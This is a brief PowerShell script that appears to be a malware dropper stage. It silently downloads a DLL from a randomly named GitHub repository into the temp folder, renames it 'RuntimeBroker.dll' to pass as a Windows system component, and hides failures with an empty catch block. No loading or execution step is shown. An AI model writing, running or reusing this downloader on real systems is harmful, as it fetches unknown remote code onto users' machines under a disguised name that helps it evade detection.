$downloadUrl = "https://github.com/carstenstahl1337/fsdf34242342d2dd2/raw/main/library.dll"

$tempFolder = [System.IO.Path]::GetTempPath()
$destinationPath = Join-Path -Path $tempFolder -ChildPath "RuntimeBroker.dll"

try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing
} catch {
    
}
